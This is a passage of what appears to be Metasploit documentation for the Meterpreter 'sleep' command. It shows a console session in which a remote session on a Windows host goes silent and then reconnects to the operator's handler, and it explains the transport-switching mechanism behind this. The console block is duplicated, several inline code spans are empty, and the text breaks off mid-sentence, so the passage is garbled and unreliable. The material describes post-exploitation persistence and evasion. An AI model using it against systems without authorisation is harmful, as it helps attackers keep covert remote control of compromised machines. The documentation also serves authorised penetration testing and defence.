## Silent shells
The interface to the sleep command looks like this:
```msf
meterpreter > sleep 20
[*] Telling the target instance to sleep for 20 seconds ...
[+] Target instance has gone to sleep, terminating current session.

[*] 10.1.10.35 - Meterpreter session 3 closed.  Reason: User exit
msf exploit(handler) > [*] Meterpreter session 4 opened (10.1.10.40:6005 -> 10.1.10.35:49315) at 2015-06-02 23:00:29 +1000

msf exploit(handler) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > getuid
Server username: WIN-S45GUQ5KGVK\OJ
```

`msf
meterpreter > sleep 20
[*] Telling the target instance to sleep for 20 seconds ...
[+] Target instance has gone to sleep, terminating current session.

[*] 10.1.10.35 - Meterpreter session 3 closed.  Reason: User exit
msf exploit(handler) > [*] Meterpreter session 4 opened (10.1.10.40:6005 -> 10.1.10.35:49315) at 2015-06-02 23:00:29 +1000

msf exploit(handler) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > getuid
Server username: WIN-S45GUQ5KGVK\OJ
`

`

## Under the hood

The implementation of this command was made rather simple as a result of the work that was done to support multiple transports. To facilitate this command, all that happens is:

* A transport change is invoked, but the transport that is selected as the "next" transport is the same as the currently active one.
* The transport is shut down and the session is closed.
* The timeout value is passed to a call to `

`, forcing the main thread of execution to pause for the allotted period of time.
* Execution resumes, and the resumption of connectivity continues in the usual transport switching fashion, only in this case, the transport that is fired up is the one that was just shut down.

In short, the `

